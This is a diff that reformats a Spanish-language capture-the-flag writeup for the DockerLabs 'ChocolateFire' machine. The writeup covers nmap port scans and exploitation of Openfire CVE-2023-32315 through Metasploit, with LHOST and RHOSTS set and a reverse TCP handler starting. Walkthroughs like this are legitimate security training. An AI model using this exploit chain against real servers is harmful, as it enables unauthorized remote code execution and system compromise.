@@ -1,22 +1,30 @@
-# 🖥️ Writeup - ChocolateFire 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs   
-**Sistema Operativo:** Linux  
+# ChcocolateFire ​​
 
-> **Tags:** `Linux` `Openfire` `XMPP` `Java` `CVE-2023-32315` `Authentication Bypass` `RCE` `Metasploit` 
+## 🖥️ Writeup - ChocolateFire
 
-# INSTALACIÓN
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
+
+> **Tags:** `Linux` `Openfire` `XMPP` `Java` `CVE-2023-32315` `Authentication Bypass` `RCE` `Metasploit`
+
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip chocolatefire.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh chocolatefire.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sC -sV -p5262,5269,7070,9090,5275 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 19:18 CEST
 Nmap scan report for 172.17.0.2
@@ -90,7 +99,7 @@ Al acceder desde el navegador, encontramos un panel de `login` de `Openfire`, qu
 
 A continuación, abrimos `Metasploit` para comprobar si existe algún exploit compatible con esta versión.
 
-# EXPLOTACIÓN
+## EXPLOTACIÓN
 
 ```bash
 msfconsole -q
@@ -98,11 +107,12 @@ msfconsole -q
 
 Tras realizar la búsqueda, seleccionamos el segundo exploit disponible.
 
-```bash 
+```bash
 search openfire
 ```
 
 Info:
+
 ```
 Matching Modules
 ================
@@ -119,7 +129,6 @@ Matching Modules
 Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
 ```
 
-
 ```bash
 use 4
 show options
@@ -127,7 +136,9 @@ set LHOST <NUESTRA IP>
 set RHOSTS 172.17.0.2
 run
 ```
+
 Info:
+
 ```
 [*] Started reverse TCP handler on 10.0.4.12:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
